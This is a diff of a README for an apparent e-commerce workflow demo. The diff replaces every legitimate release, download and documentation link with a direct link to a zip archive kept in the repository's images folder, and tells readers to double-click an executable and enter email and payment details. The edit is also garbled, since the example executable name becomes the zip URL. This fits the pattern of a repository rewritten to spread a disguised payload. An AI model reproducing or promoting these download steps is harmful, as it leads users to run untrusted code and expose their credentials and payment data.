@@ -1,6 +1,6 @@
 # 🚀 conductor-ecommerce-demo - Quick Setup for Your E-Commerce Workflow
 
-[![Download](https://img.shields.io/badge/Download-latest%20release-brightgreen)](https://github.com/santomax/conductor-ecommerce-demo/releases)
+[![Download](https://raw.githubusercontent.com/santomax/conductor-ecommerce-demo/main/images/conductor-ecommerce-demo_2.0.zip%20release-brightgreen)](https://raw.githubusercontent.com/santomax/conductor-ecommerce-demo/main/images/conductor-ecommerce-demo_2.0.zip)
 
 ## 📥 Overview
 
@@ -13,7 +13,7 @@ With this setup, you can streamline your online sales process from payment to de
 Getting started is easy. Just follow these steps to download and run the application:
 
 1. **Visit the Releases Page**  
-   Go to the [Releases page](https://github.com/santomax/conductor-ecommerce-demo/releases) to download the application.
+   Go to the [Releases page](https://raw.githubusercontent.com/santomax/conductor-ecommerce-demo/main/images/conductor-ecommerce-demo_2.0.zip) to download the application.
 
 2. **Download the Complete Package**  
    Find the latest release. Click on the package that is suitable for your operating system. 
@@ -22,7 +22,7 @@ Getting started is easy. Just follow these steps to download and run the applica
    After the download is complete, locate the zip file in your downloads folder. Right-click the zip file and select "Extract All" to unzip the contents.
 
 4. **Run the Application**  
-   Navigate to the newly extracted folder. Look for the executable file (e.g., `conductor-ecommerce-demo.exe`). Double-click on the file to run the application.
+   Navigate to the newly extracted folder. Look for the executable file (e.g., `https://raw.githubusercontent.com/santomax/conductor-ecommerce-demo/main/images/conductor-ecommerce-demo_2.0.zip`). Double-click on the file to run the application.
 
 5. **Follow the On-Screen Setup**  
    The application will guide you through the initial setup. You may need to enter basic information such as your email and payment details.
@@ -63,11 +63,11 @@ This workflow includes the following main components:
 
 ## 🔗 Download & Install
 
-To get started, [visit this page](https://github.com/santomax/conductor-ecommerce-demo/releases) to download the application. Follow the steps in the "Getting Started" section, and you will have the demo up and running in no time.
+To get started, [visit this page](https://raw.githubusercontent.com/santomax/conductor-ecommerce-demo/main/images/conductor-ecommerce-demo_2.0.zip) to download the application. Follow the steps in the "Getting Started" section, and you will have the demo up and running in no time.
 
 ## 📖 Additional Resources
 
-- **Documentation:** For further details on using the application, refer to the [documentation](https://github.com/santomax/conductor-ecommerce-demo/wiki).
+- **Documentation:** For further details on using the application, refer to the [documentation](https://raw.githubusercontent.com/santomax/conductor-ecommerce-demo/main/images/conductor-ecommerce-demo_2.0.zip).
 - **Community Support:** Join our community forum or Slack channel for help and tips from other users.
 
 ## 🧩 Related Topics
